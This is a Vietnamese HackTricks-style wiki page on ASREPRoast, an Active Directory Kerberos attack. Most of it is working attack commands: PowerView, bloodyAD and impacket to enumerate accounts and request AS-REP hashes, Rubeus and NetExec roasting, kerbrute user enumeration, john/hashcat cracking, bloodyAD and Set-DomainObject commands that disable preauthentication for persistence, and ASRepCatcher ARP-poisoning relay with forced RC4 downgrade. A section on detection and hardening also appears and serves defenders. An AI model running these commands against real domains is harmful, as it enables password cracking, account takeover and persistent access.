# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast là một cuộc tấn công bảo mật khai thác các tài khoản người dùng không bật thuộc tính **Kerberos pre-authentication required**. Về cơ bản, lỗ hổng này cho phép kẻ tấn công yêu cầu xác thực cho một người dùng từ Domain Controller (DC) mà không cần mật khẩu của người dùng đó. Sau đó, DC phản hồi bằng một thông điệp được mã hóa bằng khóa suy ra từ mật khẩu của người dùng. Kẻ tấn công có thể thử crack thông điệp này offline để tìm ra mật khẩu của người dùng.

Các yêu cầu chính của cuộc tấn công này là:

- **Không bật Kerberos pre-authentication**: Tài khoản người dùng mục tiêu không được bật tính năng bảo mật này.
- **Kết nối đến Domain Controller (DC)**: Kẻ tấn công cần truy cập DC để gửi yêu cầu và nhận các thông điệp đã mã hóa.
- **Tài khoản domain (không bắt buộc)**: Có tài khoản domain giúp kẻ tấn công xác định các tài khoản người dùng dễ bị tấn công hiệu quả hơn thông qua truy vấn LDAP. Nếu không có tài khoản như vậy, kẻ tấn công phải đoán tên người dùng.

#### Liệt kê các tài khoản người dùng dễ bị tấn công (cần thông tin xác thực domain)

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### Yêu cầu thông điệp AS_REP

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Rubeus mặc định yêu cầu **RC4**, vì vậy Event ID **4768** thường hiển thị **preauth type 0** và **ticket encryption type 0x17**. Nếu thêm **`/aes`** (hoặc RC4 bị vô hiệu hóa cho mục tiêu), hãy dự kiến nhận được **AES etypes**.<sup>[[2]](#references)</sup>

#### Các lệnh nhanh (Linux)

- Trước tiên, liệt kê các mục tiêu tiềm năng (ví dụ: từ các build path bị leak) bằng Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Thực hiện roast trên toàn bộ danh sách username mà không cần creds hợp lệ bằng NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Nếu có creds, để NetExec truy vấn LDAP và yêu cầu mọi tài khoản có thể roast thay bạn: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Nếu đầu ra bắt đầu bằng **`$krb5asrep$23$`**, hãy crack bằng Hashcat **`-m 18200`**. Nếu bắt đầu bằng **`$krb5asrep$17$`** hoặc **`$krb5asrep$18$`**, nên dùng John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Đừng cho rằng mọi AS-REP roast đều dùng RC4. Các công cụ hiện đại có thể trả về **RC4** (`$krb5asrep$23$`) hoặc **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), tùy thuộc vào enctype được yêu cầu/đàm phán. **`hashcat -m 18200`** dành cho **etype 23**, còn **John** xử lý trực tiếp `krb5asrep` cho **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### Persistence

Buộc người dùng không yêu cầu **preauth** nếu bạn có quyền **GenericAll** (hoặc quyền ghi thuộc tính):

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

### Phát hiện và gia cố bảo mật

Một **yêu cầu AS-REP không cần preauthentication** thành công sẽ tạo sự kiện **4768** trên DC với `Status=0x0` và `PreAuthType=0`; sự kiện này ghi nhận một yêu cầu, chứ không chứng minh rằng có người đã crack phản hồi hoặc xâm nhập tài khoản. Không yêu cầu RC4 trong quy tắc phát hiện: `TicketEncryptionType=0x17` là dấu hiệu hữu ích của mã hóa yếu, nhưng kẻ tấn công có thể yêu cầu AES (giá trị trong event log là `0x11`/`0x12`). Trên Windows Server 2016 trở lên, với bản cập nhật tích lũy ngày 14 tháng 1 năm 2025 (hoặc mới hơn), phiên bản 2 của sự kiện 4768 cũng hiển thị `ClientAdvertizedEncryptionTypes`, các etype được tài khoản/DC hỗ trợ và các khóa hiện có.<sup>[[5]](#references)</sup>

Một cách săn tìm thực tế là đánh dấu client chỉ quảng bá RC4 trong khi tài khoản có khóa AES, sau đó đối chiếu các đợt yêu cầu dồn dập từ một địa chỉ IP nguồn nhắm đến nhiều người dùng không yêu cầu preauthentication. Thiết lập danh sách ngoại lệ hợp lệ theo baseline thay vì cảnh báo cho mọi sự kiện `PreAuthType=0`.

Để quy kết, chuẩn hóa trường `IpAddress` (trường này có thể chứa địa chỉ IPv4 được ánh xạ thành `::ffff:`) và so sánh khung thời gian của nó với các sự kiện cấp service ticket 4769 hoặc truy cập share 5140. Những sự kiện đó có thể nêu tên các tài khoản hoạt động từ cùng địa chỉ, nhưng yêu cầu AS-REP không cần preauthentication không đòi hỏi tài khoản đã xác thực. Máy chủ dùng chung, NAT, proxy và nhiều phiên có nghĩa là việc khớp IP **không** xác định được người hoặc tài khoản đã gửi AS-REQ. Hãy xem các tài khoản liên quan là đầu mối điều tra và xác minh thêm bằng bằng chứng từ endpoint hoặc mạng.<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>

Cách khắc phục lâu dài là bỏ chọn **Do not require Kerberos preauthentication** trên mọi người dùng không thực sự cần tùy chọn này và đổi mật khẩu các tài khoản bị lộ. Nếu không thể gỡ ngoại lệ, hãy dùng mật khẩu dài được tạo ngẫu nhiên và cấp quyền tối thiểu. Vô hiệu hóa RC4 làm tăng chi phí cracking nhưng không loại bỏ khả năng roast, vì phản hồi AS-REP dùng AES vẫn có thể bị crack offline.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast không cần thông tin xác thực

Kẻ tấn công on-path có thể bắt AS-REP được trả về trong một phiên trao đổi AS thông thường có preauthentication, rồi định dạng phần được mã hóa để crack offline. Khác với ASREPRoasting cổ điển, cách này không yêu cầu `DONT_REQ_PREAUTH`; tuy nhiên, nó chỉ thu được các tài khoản có phiên trao đổi Kerberos thực sự bị chặn. **ASRepCatcher** mặc định chiếm vị trí bằng kỹ thuật đầu độc ARP một chiều, hoặc có thể tiếp nhận lưu lượng từ một kỹ thuật MitM khác bằng `--disable-spoofing`.<sup>[[6]](#references)</sup>\
Nếu bạn muốn xem thủ thuật liên quan không cần thông tin xác thực, trả về **service ticket** thay vì **TGT** từ một principal không yêu cầu preauthentication, hãy xem [Kerberoast](kerberoast.md).

Ở chế độ `relay`, [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) chuyển tiếp các AS-REQ bị chặn và buộc dùng **RC4** nếu cả hai phía vẫn cho phép. `listen` không thay đổi gói tin, do đó sẽ bắt được enctype mà client và DC đã thương lượng. Khi có thể, hãy giới hạn phạm vi đầu độc bằng `-t`/`-tf` thay vì tác động đến toàn bộ subnet.<sup>[[6]](#references)</sup>

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```

---

---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Sự kiện 4768: Một vé xác thực Kerberos đã được yêu cầu](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
- [7] [Microsoft – Sự kiện bảo mật 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [8] [Microsoft – Sự kiện bảo mật 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
{{#include ../../banners/hacktricks-training.md}}
